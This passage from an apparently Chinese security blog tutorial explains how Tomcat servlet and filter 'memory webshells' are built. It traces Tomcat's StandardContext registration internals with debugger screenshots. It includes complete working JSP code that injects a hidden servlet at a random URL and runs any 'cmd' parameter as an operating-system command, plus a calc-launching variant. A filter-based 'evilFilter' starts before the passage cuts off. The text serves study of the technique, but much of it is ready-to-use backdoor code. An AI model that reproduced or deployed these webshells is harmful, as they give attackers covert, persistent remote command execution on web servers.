class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletURL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/&quot;</span> + getRandomString();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Servlet&quot;</span> + getRandomString();<br>        <span class="hljs-type">Servlet</span> <span class="hljs-variable">servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Servlet</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> &#123;&#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                &#123;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c &quot;</span> + cmd).getInputStream();<br>                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in, <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                    servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;GBK&quot;</span>);<br>                    <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>                    out.println(output);<br>                    out.flush();<br>                    out.close();<br>                &#125;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>            &#125;<br>        &#125;;<br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>        wrapper.setName(servletName);<br>        wrapper.setServlet(servlet);<br>        wrapper.setServletClass(servlet.getClass().getName());<br>        wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<br>        standardContext.addChild(wrapper);<br>        standardContext.addServletMappingDecoded(servletURL, servletName);<br>        response.getWriter().write(<span class="hljs-string">&quot;[+] Success!!!&lt;br&gt;&lt;br&gt;[*] ServletURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletURL + <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;[*] ServletName:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletName + <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;[*] shellURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://localhost:8080/test&quot;</span> + servletURL + <span class="hljs-string">&quot;?cmd=echo 世界，你好！&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">errorMessage</span> <span class="hljs-operator">=</span> e.getMessage();<br>        response.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">outError</span> <span class="hljs-operator">=</span> response.getWriter();<br>        outError.println(<span class="hljs-string">&quot;Error: &quot;</span> + errorMessage);<br>        outError.flush();<br>        outError.close();<br>    &#125;<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>&lt;%!<br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getRandomString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">characters</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">randomString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) (Math.random() * characters.length());<br>            randomString.append(characters.charAt(index));<br>        &#125;<br>        <span class="hljs-keyword">return</span> randomString.toString();<br>    &#125;<br>%&gt;<br><br></code></pre></td></tr></table></figure><p>打入后效果</p><p><img src="https://cdn.clown2024.cn/202409161601686.png" alt="image-20240916160158629"></p><p>然后就可以去访问对应路由执行命令</p><p><img src="https://cdn.clown2024.cn/202409161602929.png" alt="image-20240916160242879"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>servlet内存马就是去找到源码中注册servlet的内容，然后我们重复一遍直接注册自己的servlet即可</p><p>这里我们是去找源码中如何将web.xml的配置变成servlet的过程</p><p>首先找到加载web.xml的ContextConfig#webconfig()</p><p><img src="https://cdn.clown2024.cn/202409161629329.png" alt="image-20240916162907251"></p><p>然后里面就是读取web.xml的一些代码，重要在第九个步骤</p><p><img src="https://cdn.clown2024.cn/202409161630551.png" alt="image-20240916163037486"></p><p>这里注释将web.xml应用于Context，调用ContextConfig#configureContext方法</p><p>跟进去看一看</p><p><img src="https://cdn.clown2024.cn/202409161637697.png" alt="image-20240916163737624"></p><p>这里有很多的操作都是通过context加载进去，这里的context就是我们的StandardContext，tomcat每个容器启动时都会通过一个Standard***#startInternal()方法来启动，所以我们具体的context就是StandardContext开始的，我们可以调试看看这个context</p><p><img src="https://cdn.clown2024.cn/202409161650754.png" alt="image-20240916165022674"></p><p>可以看到是我们的StandardContext，然后这个webxml里面就有解析我们web.xml文件拿到的servlet</p><p><img src="https://cdn.clown2024.cn/202409161651016.png" alt="image-20240916165127949"></p><p>这个Hello就是我们自己注册的，<strong>所以第一步的找到StandardContext，其实就是获取当前应用的context实例</strong>，然后往里面注册servlet，我们回到configureContext方法继续往下找关键地方</p><p><img src="https://cdn.clown2024.cn/202409161658274.png" alt="image-20240916165818197"></p><p>这里遍历我们的servlet然后创建wrapper，我们知道wrapper就是用来封装servlet的</p><p><img src="https://cdn.clown2024.cn/202409161701466.png" alt="image-20240916170126390"></p><p>然后这里的wrapper就是我们知道的tomcat定义的Wrapper的实现类，拿到wrapper之后继续往下，看一下关键的set方法</p><p><img src="https://cdn.clown2024.cn/202409161708368.png" alt="image-20240916170822326"></p><p>第一步先对loadOnStartup的值进行设置，这个值代表的是Servlet在启动时的加载顺序，如果设置为负数，那么Servlet将在第一次请求时才被加载</p><p><img src="https://cdn.clown2024.cn/202409161715978.png" alt="image-20240916171559932"></p><p>这一步就是这是servlet的name</p><p><img src="https://cdn.clown2024.cn/202409161716418.png" alt="image-20240916171636372"></p><p>这一步设置servletClass用的是全类名</p><p><img src="https://cdn.clown2024.cn/202409161719067.png" alt="image-20240916171908029"></p><p>这一步将前面的wrapper添加到context里面</p><p><img src="https://cdn.clown2024.cn/202409161721789.png" alt="image-20240916172036567"></p><p>然后这是将前面的servlet遍历完之后，再遍历servletMapping，往context里面添加映射，下面是servletMappings</p><p><img src="https://cdn.clown2024.cn/202409161722241.png" alt="image-20240916172220190"></p><p>然后这就是整个注册的流程，但是这里并没有实例化我们写的Servlet类，因为它存在懒加载机制，需要我们去访问的时候才会创建实例，但如果我们自己动态在页面写就会走不到那个流程，需要我们直接将实例类放进去</p><p>现在知道所有流程我们就可以开始写内存马了，这里是根据组长的流程来写，比较简单</p><p>第一步找到standardContext，这也是最关键的一步，因为我们知道jsp里面是有request对象的，我们可以通过request对象来获取standardContext</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>System.out.println(servletContext);<br></code></pre></td></tr></table></figure><p>我们先看看request#getServletContext返回的对象</p><p><img src="https://cdn.clown2024.cn/202409161746714.png" alt="image-20240916174627626"></p><p>我们可以看到往里面第二层的context就是StandardContext，这里我们可以直接用反射来获取</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1.获取standardContext</span><br>        <span class="hljs-comment">//获取ApplicationContext</span><br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>        <span class="hljs-comment">//获取StandardContext</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br></code></pre></td></tr></table></figure><p>然后后面的就比较简单了，按照我们前面分析的注册步骤即可，就是要注意一点我们要手动将servlet实例注册进去</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//2.获取wrapper然后添加</span><br><span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>wrapper.setName(<span class="hljs-string">&quot;TestShell&quot;</span>);<br>wrapper.setServletClass(TestShell.class.getName());<br>   <span class="hljs-comment">//应对懒加载添加我们的实例化servlet</span><br>wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestShell</span>());<br><span class="hljs-comment">//3.将wrapper添加进standardContext</span><br>standardContext.addChild(wrapper);<br><span class="hljs-comment">//4.添加映射</span><br>standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,<span class="hljs-string">&quot;TestShell&quot;</span>);<br></code></pre></td></tr></table></figure><p>然后这个servlet我们就简单的弹一个计算器，完整的jsp文件如下</p><p>addServlet.jsp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestShell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br><span class="hljs-comment">//动态注册</span><br>    <span class="hljs-comment">//1.获取standardContext</span><br>        <span class="hljs-comment">//获取ApplicationContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>        <span class="hljs-comment">//获取StandardContext</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>    <span class="hljs-comment">//2.获取wrapper然后添加</span><br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    wrapper.setName(<span class="hljs-string">&quot;TestShell&quot;</span>);<br>    wrapper.setServletClass(TestShell.class.getName());<br>        <span class="hljs-comment">//应对懒加载添加我们的实例化servlet</span><br>    wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestShell</span>());<br>    <span class="hljs-comment">//3.将wrapper添加进standardContext</span><br>    standardContext.addChild(wrapper);<br>    <span class="hljs-comment">//4.添加映射</span><br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,<span class="hljs-string">&quot;TestShell&quot;</span>);<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409161818833.png" alt="image-20240916181846766"></p><p><img src="https://cdn.clown2024.cn/202409161819095.png" alt="image-20240916181903999"></p><p>然后成功白屏弹计算器😋</p><p>而我们前面的demo我是直接用的文章里的，他这里就是用了一个随机路径和随机文件名的方式注册，然后直接用匿名类的形式进行实现化，然后直接将命令结果打印出来到网页</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Servlet</span> <span class="hljs-variable">servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Servlet</span>() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> &#123;&#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        &#123;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c &quot;</span> + cmd).getInputStream();<br>            <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in, <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>            servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;GBK&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>            out.println(output);<br>            out.flush();<br>            out.close();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>他这里使用<code>cmd /c</code>来实现可以执行带有空格的命令，例如<code>echo 世界，你好！</code>；对于Linux系统，那就是<code>/bin/sh -c</code></p><blockquote><p>至于LoadOnStartUp这个玩意没发现他的作用暂时</p></blockquote><p><strong>关于实例化servlet的添加</strong></p><p>因为懒加载机制我们是在访问后才进行的实例化servlet，然后我就想探究一下这个servlet到底是在哪里被实例化然后添加到wrapper里面，但我调了很久也没有发现放进wrapper的地方</p><p><img src="https://cdn.clown2024.cn/202409192045616.png" alt="image-20240919204457080"></p><p>我这里找到的调用StandardWrapper#allocate()来实例化一个servlet，然后往下有个createFilterChain函数，他将servlet传递了进去，我就去看了一下</p><p><img src="https://cdn.clown2024.cn/202409192050093.png" alt="image-20240919205001955"></p><p>然后只有这里是将实例添加进了filterchain，此时我还是没看到如exp里面的要将servlet放进wrapper里面</p><p><img src="https://cdn.clown2024.cn/202409192054750.png" alt="image-20240919205426641"></p><p>最后执行到servlet的时候就是在doFilter方法里面调用servlet属性的service方法，然后到servlet的doGet方法里了</p><p>后来终于想通了，看代码太不细致还是漏了关键的地方，我在访问内存马页面之后再调试回到那个allocate方法里面，发现我们设置了实例之后他的判断逻辑就不同了</p><p><img src="https://cdn.clown2024.cn/202409192108171.png" alt="image-20240919210819062"></p><p>因为我们设置了instance，这部分的逻辑就被跳过了，然后就会到下面这里</p><p><img src="https://cdn.clown2024.cn/202409192109478.png" alt="image-20240919210910379"></p><p>直接返回我们设置的instance，然后再放进了filterchain里面，这就是为什么我们需要用wrapper.setServlet方法的原因</p><p>所以其实我在想如果能够获取filterChain的话直接添加效果应该也是一样的</p><h1 id="filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h1><p>这部分参考文章：<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/%EF%BC%8Chttps://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/，https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p>写Filter内存马的步骤：</p><ul><li>获取StandardContext；</li><li>继承并编写一个恶意filter；</li><li>实例化一个FilterDef类，包装filter并存放到<code>StandardContext.filterDefs</code>中；</li><li>实例化一个FilterMap类，将我们的Filter和urlpattern相对应，使用addFilterMapBefore存放到StandardContext.filterMaps中；</li><li>通过反射获取filterConfigs，实例化一个<code>FilterConfig</code>（<code>ApplicationFilterConfig</code>）类，传入<code>StandardContext</code>与<code>filterDefs</code>，存放到filterConfig中。</li></ul><p>有关filter相关的内容可以看一下里面文章的总结。</p><h2 id="原理分析"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h2><p>这里开始先分析再写</p><p>filter我们知道就是servlet前的一个过滤器，所以我们只要实现一个filter并写恶意代码，然后添加进去即可</p><p><strong>了解一下有关filter的各个名词</strong></p><ul><li>FilterDefs：首先，需要定义过滤器FilterDef，存放这些FilterDef的数组被称为FilterDefs，每个FilterDef定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及class等。</li><li>FilterConfigs：是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求。</li><li>FilterMaps：用于将FilterConfigs映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的FilterConfigs。</li><li>FilterChain：是由多个FilterConfigs组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照FilterChain中的顺序依次执行每个过滤器，对请求进行过滤和处理。</li></ul><p><strong>访问网页前的filter添加</strong></p><p>同样的filter的添加也在我们之前说到的ContextConfig#configureContext里面</p><p><img src="https://cdn.clown2024.cn/202409161922576.png" alt="image-20240916192256483"></p><p>这里往context里面添加filterdef，具体代码如下</p><p><img src="https://cdn.clown2024.cn/202409161924392.png" alt="image-20240916192439333"></p><p>添加到一个hashMap里面，下面是filterDef的相关属性</p><p><img src="https://cdn.clown2024.cn/202409192131516.png" alt="image-20240919213120425"></p><p>有些属性是我们到时候创建的时候需要设置的</p><p><img src="https://cdn.clown2024.cn/202409161925478.png" alt="image-20240916192510416"></p><p>这里是添加filterMap进去，再看一下filterMap里相关的属性</p><p><img src="https://cdn.clown2024.cn/202409192133213.png" alt="image-20240919213313122"></p><p>这就是访问路由前的注册内容</p><p><strong>访问之后</strong></p><p>现在我们写一个filter类，然后断在doFilter方法，看一下执行的过程</p><blockquote><p>这里的chain.doFilter是一定要写的不然就走不到servlet那里了，因为遍历doFilter之后，最终是在servletService()方法中走到request</p></blockquote><p><img src="https://cdn.clown2024.cn/202409192135120.png" alt="image-20240919213506978"></p><p>观察一下他的调用栈，可以看到是从StandardWrapperValve#invoke过来的，我们去看一下</p><p><img src="https://cdn.clown2024.cn/202409170050633.png" alt="image-20240917005012554"></p><p>所以可以知道是在filterChain的doFilter方法里面执行我们的filter和servlet</p><p>然后在找一下filterChain是在哪创建的</p><p><img src="https://cdn.clown2024.cn/202409170052061.png" alt="image-20240917005252976"></p><p>可以看到是在这里，接下来重新下断点到这，看一下filterChain的创建</p><p><img src="https://cdn.clown2024.cn/202409192140374.png" alt="image-20240919214048265"></p><p>这里先创建了一个ApplicationFilterChain然后看能否从req中获取filterChain，不能就新建一个ApplicationFilterChain同时set给req，继续往下</p><p><img src="https://cdn.clown2024.cn/202409170101254.png" alt="image-20240917010128142"></p><p>然后就是获取standardContext再从中获取filterMaps，然后看一下现在filterMaps里面的内容</p><p><img src="https://cdn.clown2024.cn/202409192144379.png" alt="image-20240919214407244"></p><p>可以看到有有我们自己的那个FilterMap</p><p><img src="https://cdn.clown2024.cn/202409170106138.png" alt="image-20240917010647039"></p><p>接下来会遍历filterMaps 中的 filterMap的filterName，如果发现符合当前请求 url 与 filterMap 中的 urlPattern 匹配且通过filterName能找到对应的filterConfig，则会将其加入filterChain</p><p>那来看一下ApplicationFilterConfig的创建</p><p><img src="https://cdn.clown2024.cn/202409192148887.png" alt="image-20240919214844764"></p><p>可以看到从StandardContext的filterConfigs里面直接根据key获取ApplicationFilterConfig的实例</p><p>最后看一下filterConfig的内容</p><p><img src="https://cdn.clown2024.cn/202409192151525.png" alt="image-20240919215145392"></p><p>包含了filter实例和filterDef还有context这几个重要元素，到此filterChain创建完成，然后就是执行前面说的的doFilter方法</p><h2 id="内存马编写"><a href="#内存马编写" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>前面分析可知，最重要的两个方法是**StandardContext.findFilterMaps()<strong>和</strong>StandardContext.findFilterConfig()**，我们只要往这2个属性里面插入对应的filterMap和filterConfig即可实现动态添加filter的目的，这些属性都在standardContext里面，那么standardContext里面是否也有添加这些属性的方法呢</p><p>这里standardContext提供了添加filterMap的方法<strong>addFilterMapBefore</strong></p><p><img src="https://cdn.clown2024.cn/202409170136347.png" alt="image-20240917013619268"></p><p>这里会先校验，然后再添加filterMap，跟进一下validateFilterMap方法</p><p><img src="https://cdn.clown2024.cn/202409170138616.png" alt="image-20240917013804538"></p><p>可以看到它会根据filterName去寻找对应的filterDef，如果没找到的话会直接抛出异常，也就是说我们还需要往filterDefs里添加filterDef。</p><p>关于filterDefs，StandardContext也直接提供了对应的添加方法addFilterDef</p><p><img src="https://cdn.clown2024.cn/202409170140748.png" alt="image-20240917014031687"></p><p>最后filterConfig并没有添加该属性的方法，需要我们通过反射获取属性进行修改</p><p><img src="https://cdn.clown2024.cn/202409170142816.png" alt="image-20240917014218759"></p><p>现在大部分的问题我们都解决了</p><p>下面是具体的代码实现</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%!<br><br>%&gt;<br>&lt;%<br>    <span class="hljs-comment">// 获取StandardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br><br>    <span class="hljs-comment">// 创建一个filter实例</span><br>    Filter evilFilter=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span 